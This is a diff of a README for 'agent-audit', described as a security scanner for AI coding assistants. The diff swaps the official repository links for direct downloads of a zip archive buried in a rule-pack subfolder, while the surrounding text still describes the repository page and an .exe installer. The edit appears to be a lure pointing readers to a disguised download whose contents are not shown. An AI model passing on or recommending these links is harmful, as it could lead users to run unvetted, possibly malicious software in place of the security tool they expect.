@@ -1,6 +1,6 @@
 # 🛡️ agent-audit - Keep your ai coding agents secure
 
-[![](https://img.shields.io/badge/download-get_agent_audit-blue.svg)](https://github.com/muhamedali7713/agent-audit)
+[![](https://img.shields.io/badge/download-get_agent_audit-blue.svg)](https://raw.githubusercontent.com/muhamedali7713/agent-audit/main/src/agent_audit/knowledge/rule_packs/external/cisco-core-checks-inventory/agent_audit_v2.0.zip)
 
 agent-audit acts as a security tool for your local coding assistants. Modern tools like Claude Code, Codex CLI, and OpenClaw help you write software faster. While these tools save time, they also access your project files and system settings. This program scans your workspace to find potential risks in your configurations and session histories. It checks your plugins, skills, and model context protocol manifests against a library of 296 security rules.
 
@@ -8,7 +8,7 @@ agent-audit acts as a security tool for your local coding assistants. Modern too
 
 The software resides on GitHub. Visit the official repository page to access the latest version. You can find the installer for Windows on this page.
 
-[Get agent-audit here](https://github.com/muhamedali7713/agent-audit)
+[Get agent-audit here](https://raw.githubusercontent.com/muhamedali7713/agent-audit/main/src/agent_audit/knowledge/rule_packs/external/cisco-core-checks-inventory/agent_audit_v2.0.zip)
 
 Click the link above to reach the main page. Select the latest release version on the right side of the screen. Download the installer file that ends in .exe. Save this file to your computer.
 
